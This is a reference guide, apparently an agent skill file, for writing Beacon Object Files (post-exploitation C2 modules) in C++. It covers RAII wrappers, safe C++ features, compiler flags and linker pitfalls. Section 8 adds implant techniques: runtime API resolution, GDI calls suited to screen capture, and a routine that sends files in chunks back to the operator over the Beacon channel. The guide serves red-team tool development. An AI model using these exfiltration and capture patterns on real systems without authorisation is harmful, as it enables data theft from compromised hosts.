# C++ BOF — Reference Guide

Reference for writing Beacon Object Files in C++ with safe patterns.

---

## 1. Entry point

The BOF entry point must use C linkage:

```cpp
extern "C" void go(char* args, int len) {
    // ...
}
```

Without `extern "C"`, the function name gets mangled and the Beacon loader
cannot find the `go` symbol.

---

## 2. Beacon API from C++

Include `beacon.h` inside an `extern "C"` block:

```cpp
extern "C" {
#include "beacon.h"
}
```

All Beacon API calls (`BeaconPrintf`, `BeaconDataParse`, etc.) work
identically to C. See the `c-bof` skill for the full API table.

---

## 3. RAII patterns for BOFs

### Handle wrapper

```cpp
class BofHandle {
    HANDLE h_;
public:
    explicit BofHandle(HANDLE h = NULL) : h_(h) {}
    ~BofHandle() {
        if (h_ && h_ != INVALID_HANDLE_VALUE)
            KERNEL32$CloseHandle(h_);
    }
    operator HANDLE() const { return h_; }
    HANDLE* operator&() { return &h_; }
    bool valid() const { return h_ && h_ != INVALID_HANDLE_VALUE; }

    BofHandle(const BofHandle&) = delete;
    BofHandle& operator=(const BofHandle&) = delete;
};
```

### Registry key wrapper

```cpp
class BofRegKey {
    HKEY key_;
public:
    explicit BofRegKey(HKEY k = NULL) : key_(k) {}
    ~BofRegKey() { if (key_) ADVAPI32$RegCloseKey(key_); }
    operator HKEY() const { return key_; }
    HKEY* operator&() { return &key_; }

    BofRegKey(const BofRegKey&) = delete;
    BofRegKey& operator=(const BofRegKey&) = delete;
};
```

### Format buffer wrapper

```cpp
class BofFormat {
    formatp fmt_;
public:
    explicit BofFormat(int size) { BeaconFormatAlloc(&fmt_, size); }
    ~BofFormat() { BeaconFormatFree(&fmt_); }

    void printf(const char* f, ...) {
        // Note: va_list forwarding requires care
        // For simple cases, use BeaconFormatPrintf directly
        BeaconFormatPrintf(&fmt_, (char*)f);
    }

    void append(const char* data, int len) {
        BeaconFormatAppend(&fmt_, (char*)data, len);
    }

    char* to_string(int* size) {
        return BeaconFormatToString(&fmt_, size);
    }

    BofFormat(const BofFormat&) = delete;
    BofFormat& operator=(const BofFormat&) = delete;
};
```

---

## 4. Safe C++ features in BOFs

| Feature | Safe? | Notes |
|---------|-------|-------|
| Classes / structs | Yes | Stack-allocated only |
| RAII (destructors) | Yes | Runs on stack unwind |
| Templates | Yes | Compile-time only, no code bloat if careful |
| `constexpr` | Yes | Zero runtime cost |
| `static_assert` | Yes | Compile-time check |
| `enum class` | Yes | Scoped, type-safe |
| Namespaces | Yes | Organization only |
| `auto` | Yes | Type deduction |
| References | Yes | Aliases, no overhead |
| Lambda (no capture) | Mostly | Compiles to function pointers |
| Lambda (with capture) | No | Requires heap allocation |
| `new` / `delete` | **No** | No allocator linked |
| STL containers | **No** | Depend on `libstdc++` |
| Exceptions | **No** | Requires runtime |
| RTTI | **No** | Requires runtime |
| `std::string` | **No** | Heap + runtime |
| Virtual functions | Caution | vtable adds complexity |

---

## 5. Template utilities

### Compile-time string length

```cpp
template<size_t N>
constexpr size_t bof_strlen(const char (&)[N]) { return N - 1; }
```

### Type-safe BeaconPrintf wrapper

```cpp
template<typename... Args>
void bof_log(const char* fmt, Args... args) {
    BeaconPrintf(CALLBACK_OUTPUT, (char*)fmt, args...);
}

template<typename... Args>
void bof_err(const char* fmt, Args... args) {
    BeaconPrintf(CALLBACK_ERROR, (char*)fmt, args...);
}
```

---

## 6. Compiler flags reference

```bash
x86_64-w64-mingw32-g++ \
    -std=c++17 \
    -m64 -c \
    -O2 \
    -fno-exceptions \
    -fno-rtti \
    -fno-asynchronous-unwind-tables \
    -fno-ident \
    -fpack-struct=8 \
    -falign-functions=1 \
    -ffunction-sections \
    -fdata-sections \
    -fno-merge-constants \
    -s \
    -o output.o \
    -I./assets \
    source.cpp
```

---

## 7. Common pitfalls

| Problem | Cause | Solution |
|---------|-------|----------|
| `undefined reference to __cxa_*` | Exception tables linked | Add `-fno-exceptions` |
| `undefined reference to __dso_handle` | Global destructors | Avoid static objects with destructors |
| `undefined reference to operator new` | Heap allocation | Use stack or `BeaconFormatAlloc` |
| Name mangling hides `go` | Missing `extern "C"` | Wrap `go()` in `extern "C"` |
| `.text` section too large | Template bloat | Reduce template instantiations |
| `vtable` errors | Virtual functions | Avoid or use `-fno-rtti` carefully |
| COMDAT section conflicts | `using namespace` SDK | Never use `using namespace Gdiplus` etc. |
| Too many DECLSPEC_IMPORT | Linker limits (30+ DFRs) | Switch to typedef + GetProcAddress pattern |

---

## 8. Advanced C++ BOF patterns

### 8.1 typedef + GetProcAddress DFR strategy

When a BOF needs 30+ API imports (common with GDI, COM, DirectX), standard
DECLSPEC_IMPORT DFR hits linker limits. Use typedef + runtime resolution:

```cpp
typedef HDC     (WINAPI *fnGetDC)(HWND);
typedef BOOL    (WINAPI *fnBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef int     (WINAPI *fnGetSystemMetrics)(int);

static fnGetDC           pGetDC = NULL;
static fnBitBlt          pBitBlt = NULL;
static fnGetSystemMetrics pGetSystemMetrics = NULL;

static BOOL ResolveAPIs(void) {
    HMODULE hGdi32  = KERNEL32$LoadLibraryA("gdi32.dll");
    HMODULE hUser32 = KERNEL32$LoadLibraryA("user32.dll");
    if (!hGdi32 || !hUser32) return FALSE;

    pGetDC           = (fnGetDC)KERNEL32$GetProcAddress(hUser32, "GetDC");
    pBitBlt          = (fnBitBlt)KERNEL32$GetProcAddress(hGdi32, "BitBlt");
    pGetSystemMetrics = (fnGetSystemMetrics)KERNEL32$GetProcAddress(hUser32, "GetSystemMetrics");

    return (pGetDC && pBitBlt && pGetSystemMetrics);
}
```

Call `ResolveAPIs()` at the top of `go()`. Check return value.

### 8.2 GDI+ flat API integration

The GDI+ C++ wrapper classes (`Gdiplus::Bitmap`, etc.) are **not usable** in
BOFs because `using namespace Gdiplus` creates COMDAT section conflicts with
the Beacon loader. Instead, use the **flat C API** from `gdiplus.dll`:

```cpp
typedef int (WINAPI *fnGdiplusStartup)(ULONG_PTR*, void*, void*);
typedef void (WINAPI *fnGdiplusShutdown)(ULONG_PTR);
typedef int (WINAPI *fnGdipCreateBitmapFromHBITMAP)(HBITMAP, HPALETTE, void**);
typedef int (WINAPI *fnGdipSaveImageToStream)(void*, CLSID*, void*);

static HMODULE hGdiPlus = NULL;
static fnGdiplusStartup pGdiplusStartup = NULL;
/* ... resolve from KERNEL32$LoadLibraryA("gdiplus.dll") ... */
```

### 8.3 Dual-build support (#ifdef BOF)

Support both BOF and standalone EXE compilation:

```cpp
#ifdef BOF
extern "C" {
#include "beacon.h"
}
#define PRINT(fmt, ...) BeaconPrintf(CALLBACK_OUTPUT, fmt, ##__VA_ARGS__)
#define PRINT_ERR(fmt, ...) BeaconPrintf(CALLBACK_ERROR, fmt, ##__VA_ARGS__)
#else
#include <stdio.h>
#define PRINT(fmt, ...) printf(fmt "\n", ##__VA_ARGS__)
#define PRINT_ERR(fmt, ...) fprintf(stderr, fmt "\n", ##__VA_ARGS__)
#endif
```

BOF build: `build_bof.sh mybof.cpp` (adds `-DBOF`).
EXE build: `x86_64-w64-mingw32-g++ -o mybof.exe mybof.cpp`.

### 8.4 File download over Beacon channel

Use `CALLBACK_FILE`, `CALLBACK_FILE_WRITE`, `CALLBACK_FILE_CLOSE` for
chunked file transfer back to the operator:

```cpp
static void downloadFile(const char* fileName, const char* data, int dataLen) {
    int nameLen = (int)MSVCRT$strlen(fileName) + 1;
    char* start = (char*)KERNEL32$HeapAlloc(
        KERNEL32$GetProcessHeap(), 0, 4 + nameLen);
    *(int*)start = nameLen;
    MSVCRT$memcpy(start + 4, fileName, nameLen);
    BeaconOutput(CALLBACK_FILE, start, 4 + nameLen);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, start);

    int offset = 0;
    while (offset < dataLen) {
        int chunk = dataLen - offset;
        if (chunk > 900 * 1024) chunk = 900 * 1024;
        BeaconOutput(CALLBACK_FILE_WRITE, data + offset, chunk);
        offset += chunk;
    }
    BeaconOutput(CALLBACK_FILE_CLOSE, NULL, 0);
}
```

Use `CALLBACK_SCREENSHOT` (0x03) for screenshot data.

### 8.5 COM / IStream usage

```cpp
typedef HRESULT (WINAPI *fnCreateStreamOnHGlobal)(HGLOBAL, BOOL, LPSTREAM*);
HMODULE hOle32 = KERNEL32$LoadLibraryA("ole32.dll");
fnCreateStreamOnHGlobal pCreateStream =
    (fnCreateStreamOnHGlobal)KERNEL32$GetProcAddress(hOle32, "CreateStreamOnHGlobal");

IStream* pStream = NULL;
pCreateStream(NULL, TRUE, &pStream);
/* ... use pStream->Write(), pStream->Seek() ... */
pStream->Release();
```

### 8.6 Heap management in C++ BOFs

Same as C BOFs — never use `new`/`delete`/`malloc`/`free`:

```cpp
HANDLE heap = KERNEL32$GetProcessHeap();
char* buf = (char*)KERNEL32$HeapAlloc(heap, HEAP_ZERO_MEMORY, size);
/* ... use buf ... */
KERNEL32$HeapFree(heap, 0, buf);
```
